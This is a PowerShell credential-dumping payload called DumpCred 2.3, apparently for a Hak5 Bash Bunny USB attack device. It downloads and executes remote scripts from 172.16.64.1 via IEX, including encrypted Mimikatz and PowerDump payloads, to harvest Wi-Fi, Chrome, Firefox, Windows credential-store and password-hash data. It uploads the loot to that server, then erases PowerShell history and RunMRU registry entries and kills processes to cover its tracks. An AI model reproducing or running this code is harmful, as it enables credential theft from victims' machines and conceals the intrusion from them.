
<#
.SYNOPSIS
   DumpCred 2.3
.DESCRIPTION
   Dumps all Creds from a PC 
.PARAMETER <paramName>
   none
.EXAMPLE
   DumpCred
#>



$_Version = "2.3.3"
$_BUILD = "1013"

# Encoded File Info
$HTTP_Server="172.16.64.1"
$Password="hak5bunny"
$date = date

# other vars
$FILE="$env:COMPUTERNAME.txt"
$TMPFILE=[System.IO.Path]::GetTempFileName()
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
$LINE3="`n`n`n"
$OFS = "`n"

######################### Some functions ########################

$runFunc = {function Run {
    param ([String]$PSFile, [String]$Password="hak5bunny", [String]$Server="172.16.64.1", [Switch]$isEncrypted)

        $WebClient = New-Object net.WebClient
        $WebClient.Encoding =[System.Text.Encoding]::UTF8
        
        if ( $isEncrypted ) {
            
            $WebClient.Encoding =[System.Text.Encoding]::Unicode
            $InputString = ($WebClient.DownloadString('http://' + $Server + '/PS/' + $PSFile + '.enc')).trim()


		    # Decrypt with custom algo
		    $InputData = [Convert]::FromBase64String($InputString)
		
		    $Salt = New-Object Byte[](32)
		    [Array]::Copy($InputData, 0, $Salt, 0, 32)
		    $Rfc2898 = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Password,$Salt)
		    $AESKey = $Rfc2898.GetBytes(32)
		    $AESIV = $Rfc2898.GetBytes(16)
		    $Hmac = New-Object System.Security.Cryptography.HMACSHA1(,$Rfc2898.GetBytes(20))
		
		    $AuthCode = $Hmac.ComputeHash($InputData, 52, $InputData.Length - 52)
		
		    if (Compare-Object $AuthCode ($InputData[32..51]) -SyncWindow 0) {
			    throw 'Checksum failure.'
		    }
		    
		    $AES = New-Object Security.Cryptography.RijndaelManaged
		    $AESDecryptor = $AES.CreateDecryptor($AESKey, $AESIV)
		
		    $DecryptedInputData = $AESDecryptor.TransformFinalBlock($InputData, 52, $InputData.Length - 52)
		
		    $DataStream = New-Object System.IO.MemoryStream($DecryptedInputData, $false)
		    if ($DecryptedInputData[0] -eq 0x1f) {
			    $DataStream = New-Object System.IO.Compression.GZipStream($DataStream, [IO.Compression.CompressionMode]::Decompress)
		    }
		
		    $StreamReader = New-Object System.IO.StreamReader($DataStream, $true)
		    iex ([System.Text.Encoding]::unicode.GetString([System.Convert]::FromBase64String($StreamReader.ReadToEnd())))
        } else {
            IEX $WebClient.DownloadString('http://' + $Server + '/PS/' + $PSFile + '.ps1')
        }
    }
}

#######################################################################

# Kill all cmd's and Chrome
taskkill /F /IM cmd.exe
taskkill /F /IM chrome.exe

# First remove all jobs  I'm so bad....., don't care about running jobs top all, remove all
Stop-Job *
Remove-Job *

############# Start collect data




$header = "#DumpCreds " + $_VERSION + " Build " + $_BUILD + "`n"
$header = $header + "=======================================================`n"
$header = $header + "Admin Mode: `t $isAdmin`n"
$header = $header + "Date: `t`t`t $date`n"
$header = $header + "Computername: `t $env:COMPUTERNAME `n" 
$header = $header + "=======================================================`n"
$header = $header + " "
$header = $header + $LINE3




# Start all Scripts as job
Write-Host "Run Scripts..."

$runBlock = {Param($File, $Server) Run -PSFile $File -Server $Server}
$runBlockEnc = {Param($File,$Pass, $Server) Run -PSFile $File -Password $Pass -Server $Server -isEncrypted}


Write-Host "`t Get-WifiCreds";
Start-Job -ScriptBlock $runBlock -InitializationScript $runFunc -ArgumentList ("Get-WiFiCreds", $HTTP_SERVER) | out-null
Write-Host "`t Get-ChromeCreds"
Start-Job -ScriptBlock $runBlock -InitializationScript $runFunc -ArgumentList ("Get-ChromeCreds", $HTTP_SERVER) | out-null
#Write-Host "`t Get-IECreds"
#Start-Job -ScriptBlock $runBlock -InitializationScript $runFunc -ArgumentList ("Get-IECreds", $HTTP_SERVER) | out-null
Write-Host "`t Get-FoxDump" 
Start-Job -ScriptBlock $runBlock -InitializationScript $runFunc -ArgumentList ("Get-FoxDump", $HTTP_SERVER) -RunAs32 | out-null
Write-Host "`t Get-Inventory" 
Start-Job -ScriptBlock $runBlock -InitializationScript $runFunc -ArgumentList ("Get-Inventory", $HTTP_Server) | out-null
if ($isAdmin) {
    Write-Host "`t Get-M1m1d0gz" 
    Start-Job -ScriptBlock $runBlockEnc -InitializationScript $runFunc -ArgumentList ("Invoke-M1m1d0gz",$Password, $HTTP_SERVER) | out-null
    Write-Host "`t Get-PowerDump" 
    Start-Job -ScriptBlock $runBlockEnc -InitializationScript $runFunc -ArgumentList ("Invoke-PowerDump", $HTTP_SERVER) | out-null
    Write-Host "`t dumpCredStore";
    Start-Job -ScriptBlock $runBlock -InitializationScript $runFunc -ArgumentList ("dumpCredStore", $HTTP_Server) | out-null
}

# Wait for all jobs
Write-Host "Waiting for finishing Jobs"
Get-Job | Wait-Job |out-null

Write-host "Receiving results"
# Receive all results
$Result = Get-Job | Receive-Job
$OUT = $header + $Result
$OUT = $out.Replace([char][int]10, "`n")


# Upload Result to bunny's loot dir
(New-Object Net.WebClient).UploadString('http://' + $HTTP_Server +'/' + $env:COMPUTERNAME, $OUT)
(New-Object Net.WebClient).UploadString('http://' + $HTTP_Server + '/EOF', 'EOF');



# Remove Last Lines from History and Reg
# Powershell History
$a = Get-Content "$env:TEMP\~ps199876af.tmp"
$b = $a[0..($a.count - 2)]
$b | set-Content "$env:TEMP\~ps199876af.tmp"

# Remove last command from RunMRU saved file 
#======================================================================
$oMRU = New-Object System.Collections.ArrayList

$list = get-content "$env:TEMP\~tg199876cb.tmp"
$mrulist = (($list | Where-Object {$_.contains("MRUList")}) -split "=")[1] -replace '"' , ''
$MRUarr = $mrulist.ToCharArray() |Sort-Object -Descending
$hChar =$MRUarr[0]
$MRUarr = $MRUarr[1..($MRUarr.Length-1)]
$mrulist = -join $MRUarr
$larr = $list -split 0x0D, 0x0A


for ($i = 0; $i -le $larr.GetUpperBound(0); $i++) {
    if ($larr[$i] | Where-Object {$_.contains("MRUList")}) {
        $s = '"MRUList"="' + $mrulist + '"'
        $oMRU.add("$s") >$null
        $i++
    }
    if (-not ($larr[$i] | Where-Object {$_.contains('"' + $hChar + '"=')})) {
        $oMRU.add($larr[$i]) >$null
    }
}
#### for debugging uncomment vars
#$hChar
#$mrulist
#foreach ($element in $oMRU) {$element}
#### Debugging end 

#  Epmty Run Input Field Restore changed file
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentContinue
remove-item "$env:TEMP\~tg199876cb.tmp" -ErrorAction Continue
foreach ($element in $oMRU) {$element |Out-File "$env:TEMP\~tg199876cb.tmp" -Append -ErrorAction Continue}


# Kill all Powershell Tasks
taskkill /F /IM powershell.exe